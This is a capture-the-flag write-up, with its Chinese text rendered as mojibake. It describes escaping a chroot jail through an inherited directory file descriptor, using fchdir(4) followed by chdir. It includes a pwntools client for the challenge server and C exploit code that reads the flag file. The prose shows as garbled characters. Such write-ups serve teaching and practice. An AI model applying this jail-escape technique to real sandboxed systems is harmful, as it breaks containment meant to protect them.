åªéœ€è¦å†™ä¸€ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶åˆ©ç”¨å·²æœ‰çš„æ–‡ä»¶æè¿°ç¬¦åˆ‡æ¢å·¥ä½œç›®å½•åˆ°jailä¹‹å¤–ï¼Œç„¶ååˆ‡æ¢åˆ°æ ¹ç›®å½•ï¼Œè¯»å–flagå°±è¡Œäº†ã€‚

è§‚å¯Ÿå‘ç°ç¨‹åºçš„initå‡½æ•°ä¸­æ‰“å¼€è¿‡ **/tmp** å’Œ **/** ä¸¤ä¸ªç›®å½•çš„æ–‡ä»¶æè¿°ç¬¦ï¼Œå¹¶ä¸”æ²¡æœ‰è¢«å…³é—­ï¼Œç»§æ‰¿åˆ°äº†å­è¿›ç¨‹ä¸­ã€‚é‚£ä¹ˆä»–ä»¬çš„æ–‡ä»¶æè¿°ç¬¦åº”åˆ†åˆ«ä¸º3å’Œ4....æˆ‘å…¶å®æƒ³åˆ°è¿™ä¸ªæ€è·¯æŒºæ—©çš„ï¼Œä½†æ˜¯ä¸€ç›´å†™çš„æ˜¯fchdir(3)æ²¡æˆåŠŸ...åæ¥ç»•äº†ä¸€å¤§åœˆæ”¹æˆäº†fchdir(4)çªç„¶å°±æˆåŠŸäº†ï¼Œå·®ç‚¹åè¡€ã€‚

åæ¥kooå¸ˆå‚…å‘Šè¯‰æˆ‘/tmpæ— æ³•ç»§æ‰¿ï¼Œå› ä¸ºfcntlç¦æ­¢äº†ï¼Œæˆ‘æ‰ä¼¼æ‡‚éæ‡‚å’‹å›äº‹...



#### exp-pythonéƒ¨åˆ†ï¼š

```python
from pwn import *
context.log_level = 'debug'

io = remote("pwn.challenge.mini.lctf.online",10009)

def runbin(lenth, data, arg):
    io.sendlineafter('len?\n', str(lenth))
    io.sendlineafter('data?\n', data)
    io.sendlineafter('elf?\n', arg)

if __name__ == '__main__':
    f = open('./exploit', 'rb')
    payload = f.read()
    runbin(len(payload)+1, payload, '')
    io.interactive()
    io.close()
```

#### exp-Céƒ¨åˆ†ï¼š

```c
#include <unistd.h>
#include <stdio.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <fcntl.h>
#include <dirent.h>
#include <stdlib.h>
//gcc -o exploit ./exploit.c -masm=intel -no-pie -static

void show_dir(const char *path){
    DIR *dirp; 
    struct dirent *dp;
    dirp = opendir(path); 
    while ((dp = readdir(dirp)) != NULL) { 
        printf("%s\n", dp->d_name );
    }      
    (void) closedir(dirp); 
}

void catflag(char * flag)
{
    FILE * f = fopen(flag, "r");
    char buf[60] = {0};
    fread(buf, 1, 60, f);
    fclose(f);
    write(1,buf,60);
    return;
}

int main(int argc, const char **argv, const char **envp)
{
    setvbuf(stdout,0,2,0);
    fchdir(4);
    chdir("../../../../../../../");
    show_dir(".");
	catflag("flag");
    return 0;
}
```





